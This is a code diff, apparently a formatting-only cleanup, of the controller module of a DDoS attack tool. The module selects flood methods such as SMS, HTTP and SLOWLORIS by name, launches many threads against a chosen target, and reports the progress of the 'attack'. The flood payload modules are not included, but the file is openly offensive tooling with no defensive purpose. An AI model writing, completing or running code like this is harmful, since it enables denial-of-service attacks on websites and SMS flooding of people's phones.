@@ -1,4 +1,3 @@
-
 # Import modules
 from time import time, sleep
 from threading import Thread
@@ -8,6 +7,8 @@ from tools.crash import CriticalError
 from tools.ipTools import GetTargetAddress, InternetConnectionCheck
 
 """ Find & import ddos method """
+
+
 def GetMethodByName(method):
     if method == "SMS":
         dir = "tools.SMS.main"
@@ -16,16 +17,22 @@ def GetMethodByName(method):
     elif method in ("HTTP", "SLOWLORIS"):
         dir = f"tools.L7.{method.lower()}"
     else:
-        raise SystemExit(f"{Fore.RED}[!] {Fore.MAGENTA}Unknown ddos method {repr(method)} selected..{Fore.RESET}")
-    module = __import__(dir, fromlist=['object'])
+        raise SystemExit(
+            f"{Fore.RED}[!] {Fore.MAGENTA}Unknown ddos method {repr(method)} selected..{Fore.RESET}"
+        )
+    module = __import__(dir, fromlist=["object"])
     if hasattr(module, "flood"):
         method = getattr(module, "flood")
         return method
     else:
-        CriticalError(f"Method 'flood' not found in {repr(dir)}. Please use python 3.8", '-')
+        CriticalError(
+            f"Method 'flood' not found in {repr(dir)}. Please use python 3.8", "-"
+        )
 
 
 """ Class to control attack methods """
+
+
 class AttackMethod:
 
     # Constructor
@@ -72,18 +79,23 @@ class AttackMethod:
             thread = Thread(target=self.__RunFlood)
             self.threads.append(thread)
         # Start flood threads
-        with Spinner(label=f"{Fore.YELLOW}Starting {self.threads_count} threads{Fore.RESET}", total=100) as spinner:
+        with Spinner(
+            label=f"{Fore.YELLOW}Starting {self.threads_count} threads{Fore.RESET}",
+            total=100,
+        ) as spinner:
             for index, thread in enumerate(self.threads):
                 thread.start()
                 spinner.step(100 / len(self.threads) * (index + 1))
         # Wait flood threads for stop
         for index, thread in enumerate(self.threads):
             thread.join()
-            print(f"{Fore.GREEN}[+] {Fore.YELLOW}Stopped thread {index + 1}.{Fore.RESET}")
+            print(
+                f"{Fore.GREEN}[+] {Fore.YELLOW}Stopped thread {index + 1}.{Fore.RESET}"
+            )
 
     # Start ddos attack
     def Start(self):
-        target = str(self.target).strip("()").replace(", ", ':').replace("'", '')
+        target = str(self.target).strip("()").replace(", ", ":").replace("'", "")
         duration = format_timespan(self.duration)
         print(
             f"{Fore.MAGENTA}[?] {Fore.BLUE}Starting attack to {target} using method {self.name}.{Fore.RESET}\n"
@@ -94,7 +106,9 @@ class AttackMethod:
             self.__RunThreads()
         except KeyboardInterrupt:
             self.is_running = False
-            print(f"\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detected. Stopping {self.threads_count} threads..{Fore.RESET}")
+            print(
+                f"\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detected. Stopping {self.threads_count} threads..{Fore.RESET}"
+            )
             # Wait all threads for stop
             for thread in self.threads:
                 thread.join()
